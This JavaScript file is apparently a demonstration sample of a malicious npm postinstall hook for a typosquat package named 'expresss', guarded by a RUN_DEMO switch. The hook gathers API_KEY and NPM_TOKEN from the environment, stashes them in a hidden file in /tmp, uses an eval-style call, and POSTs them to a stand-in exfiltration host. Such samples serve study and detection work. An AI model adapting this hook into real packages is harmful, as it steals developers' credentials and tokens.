/**
 * MALICIOUS (DEMO): Postinstall hook for typosquat package.
 * Guarded by RUN_DEMO to avoid accidental execution.
 */

const https = require("https");
const fs = require("fs");

const target = "https://203.0.113.10/exfil"; // documentation-only IP
const payloadB64 = Buffer.from("demo-only-payload").toString("base64");

function performShadyStuff() {
  const envSnapshot = {
    apiKey: process.env.API_KEY,
    npmToken: process.env.NPM_TOKEN,
    user: process.env.USER,
  };

  // Mild obfuscation / eval pattern
  const decoded = Buffer.from(payloadB64, "base64").toString("utf8");
  // eslint-disable-next-line no-new-func
  new Function("return '" + decoded + "'")();

  try {
    fs.writeFileSync("/tmp/.expresss-stash", JSON.stringify(envSnapshot));
  } catch {}

  const body = JSON.stringify({ envSnapshot, note: "DEMO ONLY" });

  try {
    const req = https.request(target, { method: "POST" }, (res) => {
      res.on("data", () => {});
    });
    req.on("error", () => {});
    req.write(body);
    req.end();
  } catch {}
}

if (process.env.RUN_DEMO === "1") {
  performShadyStuff();
} else {
  console.log("[expresss] Postinstall skipped (set RUN_DEMO=1 to run demo)");
}
